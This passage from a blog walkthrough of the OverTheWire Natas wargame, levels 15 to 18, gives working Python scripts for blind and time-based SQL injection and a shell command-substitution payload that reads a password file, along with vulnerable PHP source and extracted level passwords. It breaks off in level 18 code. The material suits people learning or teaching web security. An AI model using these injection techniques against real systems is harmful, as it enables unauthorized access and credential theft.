</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="c"># this is the range of possible values</span>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">testchars</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># binary keyword forces a case sensitive search</span>
</span><span class='line'>    <span class="n">query</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">&quot;natas16</span><span class="se">\&quot;</span><span class="s"> AND password like BINARY </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> \
</span><span class='line'>                 <span class="n">passwd</span> <span class="o">+</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="s">&quot;%</span><span class="se">\&quot;</span><span class="s"> -- &quot;</span><span class="p">,</span><span class="n">submit</span><span class="o">=</span><span class="s">&quot;Check existence&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># example query: {&#39;username&#39;: &#39;natas16&quot; AND password like BINARY &quot; a%&quot; -- &#39;}</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas15.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                      <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas15&#39;</span><span class="p">,</span> <span class="s">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span><span class="p">),</span>\
</span><span class='line'>                      <span class="n">params</span> <span class="o">=</span> <span class="n">query</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># example encoded query (automatic encoding):</span>
</span><span class='line'>    <span class="c"># username=natas16%22+AND+password+like+BINARY+%22+a%25%22+--+</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&quot;This user exists&quot;</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">passwd</span> <span class="o">+=</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">passwd</span>
</span><span class='line'>        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>The passwod will be slowly built like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>W
</span><span class='line'>Wa
</span><span class='line'>WaI
</span><span class='line'>WaIH
</span><span class='line'>WaIHE
</span><span class='line'>WaIHEa
</span><span class='line'>WaIHEac
</span><span class='line'>WaIHEacj
</span><span class='line'>WaIHEacj6
</span><span class='line'>WaIHEacj63
</span><span class='line'>WaIHEacj63w
</span><span class='line'>WaIHEacj63wn
</span><span class='line'>WaIHEacj63wnN
</span><span class='line'>WaIHEacj63wnNI
</span><span class='line'>WaIHEacj63wnNIB
</span><span class='line'>WaIHEacj63wnNIBR
</span><span class='line'>WaIHEacj63wnNIBRO
</span><span class='line'>WaIHEacj63wnNIBROH
</span><span class='line'>WaIHEacj63wnNIBROHe
</span><span class='line'>WaIHEacj63wnNIBROHeq
</span><span class='line'>WaIHEacj63wnNIBROHeqi
</span><span class='line'>WaIHEacj63wnNIBROHeqi3
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5n
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nh
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nhm
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</span></code></pre></td></tr></table></div></figure>


<p>And now we have the password for natas16: <code>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</code></p>

<h3>Level 16</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas16.png" title="natas16" alt="natas 16"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;`\&#39;&quot;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="se">\&quot;</span><span class="si">$key</span><span class="se">\&quot;</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Right, this is similar to level 9. This time, however, there is character filtering in place, so we can&rsquo;t use any of these: <code>;|&amp;`\&lsquo;&ldquo;</code>. So there is no way to inject or chain commands..at the first glance! There is one useful character that is not filtered! The dollar sign! This is used in the bash shell in the same way as the backticks: for <a href="http://bash.cyberciti.biz/guide/Command_substitution">command substitution</a></p>

<p>Basically, you can use it to run a command and store its output in a variable or display it with the <em>echo</em> command. It looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# echo $(whoami)
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>So we want to bruteforce the password in the way we did before. Whatever we run with the $() command will be placed inside the $key variable, which is passed to grep against the dictionary file. If there is a match, the words containing it are displayed, else nothing is displayed. This is the behavior we will exploit for True and False values with our injection</p>

<p>Let&rsquo;s test it first. In the form field, I injected <code>$(echo matrix)</code>, and that return all the matches for that word:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Output:
</span><span class='line'>
</span><span class='line'>matrix
</span><span class='line'>matrix's
</span><span class='line'>matrixes</span></code></pre></td></tr></table></div></figure>


<p>The code executed by the server ends up being <code>grep -i matrix dictionary.txt</code>. Now, if I inject a non-existent word, there is no output. So to check for the password, we will use a nested grep inside the main grep, that will look like this: <code>$(grep -E ^a.* /etc/natas_webpass/natas17)matrix</code>. This checks if the password starts with a, and we will then iterate over all characters. Let&rsquo;s imagine what happens if a is the first character of the password:</p>

<ul>
<li><p>the nested grep that we injected returns a, which is appended to the word we passed after, matrix in this case, so the server-side grep looks for the word amatrix in the dictionary file, and since that doesn&rsquo;t exist, nothing is returned. So we know that if nothing is returned, we had a match</p></li>
<li><p>there is no match for the nested grep, so the matrix word remains unchanged, and the server returns all the matrix words, which means there was no match for the character we tried in the password</p></li>
</ul>


<p>To automate the injection process, I wrote a Python script again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">testchars</span><span class="p">:</span>
</span><span class='line'>            <span class="n">passwd</span> <span class="o">+=</span> <span class="n">char</span>
</span><span class='line'>            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;needle&#39;</span><span class="p">:</span> <span class="s">&quot;$(grep -E ^&quot;</span> <span class="o">+</span> <span class="n">passwd</span> <span class="o">+</span> <span class="s">&quot;.* /etc/natas_webpass/natas17)matrix&quot;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Search&#39;</span><span class="p">}</span>
</span><span class='line'>            <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas16.natas.labs.overthewire.org/?needle=&#39;</span><span class="p">,</span>
</span><span class='line'>                                 <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas16&#39;</span><span class="p">,</span> <span class="s">&#39;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#39;</span><span class="p">),</span>
</span><span class='line'>                                 <span class="n">params</span> <span class="o">=</span> <span class="n">payload</span><span class="p">)</span>
</span><span class='line'>            <span class="n">response</span> <span class="o">=</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;Trying: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>            <span class="k">if</span> <span class="s">&quot;matrix&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="s">&quot;Password: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>                <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>                <span class="k">break</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># keep the chars that matched</span>
</span><span class='line'>                <span class="n">passwd</span> <span class="o">=</span> <span class="n">passwd</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Done! Password: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Password:  8
</span><span class='line'>Password:  8P
</span><span class='line'>Password:  8Ps
</span><span class='line'>Password:  8Ps3
</span><span class='line'>Password:  8Ps3H
</span><span class='line'>Password:  8Ps3H0
</span><span class='line'>Password:  8Ps3H0G
</span><span class='line'>Password:  8Ps3H0GW
</span><span class='line'>Password:  8Ps3H0GWb
</span><span class='line'>Password:  8Ps3H0GWbn
</span><span class='line'>Password:  8Ps3H0GWbn5
</span><span class='line'>Password:  8Ps3H0GWbn5r
</span><span class='line'>Password:  8Ps3H0GWbn5rd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7G
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7Gm
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmA
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdg
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQ
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQN
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdk
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkh
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhP
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
</span><span class='line'>Done! Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</span></code></pre></td></tr></table></div></figure>


<p>Cool, we have the password for the next level: <code>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</code></p>

<h3>Level 17</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas15.png" title="natas17" alt="natas 17"></p>

<p>Again, a level similar to a previous one. This will be another case of SQL injection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;This user exists.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;This user doesn&#39;t exist.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;Error in query.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>We know the database is vulnerable, but nothing is displayed to the screen, because the <em>echo</em> statements are commented out. So we&rsquo;re going in blind! To determine if the database returns True or False to our query, we can use time-based SQL injection, by making the database load longer if our query is true, and normal if not. I tested it with this injection string: <code>natas18" AND SLEEP(5)&mdash; </code>. As expected, since the user natas18 exists, the page took 5 seconds to load. When the username didn&rsquo;t exist, it loaded instantly. So the sleep function is executed if the previous part of the query was true, but not if it&rsquo;s false. With this in mind, I modified the Python script I used before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">testchars</span><span class="p">):</span>
</span><span class='line'>    <span class="n">query</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;natas18&quot; and password like binary &#39;</span> <span class="o">+</span> <span class="s">&#39;&quot;&#39;</span> <span class="o">+</span> <span class="n">passwd</span> <span class="o">+</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;%&quot; &#39;</span> <span class="o">+</span> <span class="s">&#39;and sleep(15)-- &#39;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Check existence&#39;</span><span class="p">}</span>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas17.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas17&#39;</span><span class="p">,</span> <span class="s">&#39;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#39;</span><span class="p">),</span>\
</span><span class='line'>                          <span class="n">params</span> <span class="o">=</span> <span class="n">query</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span> <span class="c"># how many seconds to wait for a response</span>
</span><span class='line'>    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span><span class='line'>        <span class="n">passwd</span> <span class="o">+=</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Password: &#39;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Done! Password is &#39;</span><span class="p">,</span> <span class="n">passwd</span>
</span></code></pre></td></tr></table></div></figure>


<p>This took long because I had to use higher values for sleep() and timeout..the script kept stopping early with shorter times. Anyway, skipping the build-up output, the passwod is <code>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</code></p>

<h3>Level 18</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas18.png" title="natas18" alt="natas 18"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$maxid</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span> <span class="c1">// 640 should be enough for everyone</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">isValidAdminLogin</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="cm">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
</span><span class='line'>        <span class="c1">//return 1;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">isValidID</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
